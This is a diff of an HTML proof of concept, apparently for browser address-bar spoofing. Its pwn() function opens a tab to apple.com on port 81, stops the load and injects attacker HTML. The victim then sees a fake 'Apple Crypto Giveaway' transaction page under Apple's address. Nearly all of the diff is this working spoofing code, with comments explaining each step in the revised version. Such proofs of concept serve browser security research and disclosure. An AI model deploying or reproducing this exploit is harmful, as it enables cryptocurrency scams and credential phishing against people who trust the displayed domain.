@@ -1,35 +1,18 @@
-<head>
-<meta name = "viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-<style>
-html,
-body {
-  overflow-x: hidden;
-  height: 100%;
-}
-body {
-  position: relative;
-}</style></head><body>
-<center><br><br><br><h1>Enter Apple crypto giveaway:<br></h1>
-
-<img style=cursor:pointer;width:300px src=https://www.creativefabrica.com/wp-content/uploads/2022/03/02/Giveaway-and-Enter-to-Win-Banner-2-Graphics-26324567-1-1-580x386.jpg onclick=pwn()>
-
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <script>
 var v='';
-
 function pwn(){
 
-v=window.open('blob:','v');
+// Open new tab with apple.com:81 as location which won't be loaded
+v=window.open('https://apple.com:81');
 
 setTimeout(()=>{
 
-v.document.write(`
-<body onclick=pwn()>
-<img src=https://www.creativefabrica.com/wp-content/uploads/2022/03/02/Giveaway-and-Enter-to-Win-Banner-2-Graphics-26324567-1-1-580x386.jpg>
-<script>
-var jj=''; 
-function pwn(){
-jj=window.open('blob:','jj');
-jj.document.write(\`
+// Stop newly created tab from loading
+v.stop();
+
+// Change tab to our content we want since it's origin will become about:blank
+v.document.body.innerHTML=`
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -111,14 +94,19 @@ display: inline;
         <p class="loading">Waiting for transaction... Loading</p>
     </div>
 </body>
-</html>\`);
-setTimeout(()=>{jj.location='https://apple.com:81/'},1000)
-}<\/script>
-`);
+</html>
 
-},1000);
-v.location='https://apple.com:81/';
+`
+},1000)
+
+setTimeout(()=>{
+
+// After couple milliseconds change the location back to apple.com:81 which won't load and the contents of tab will be what we have set
+v.location=('https://apple.com:81');
+
+},1500)
+
 }
-
-
 </script>
+
+<br><br><br><br><center><h1 onclick=pwn()>Enter Apple Crypto Giveaway
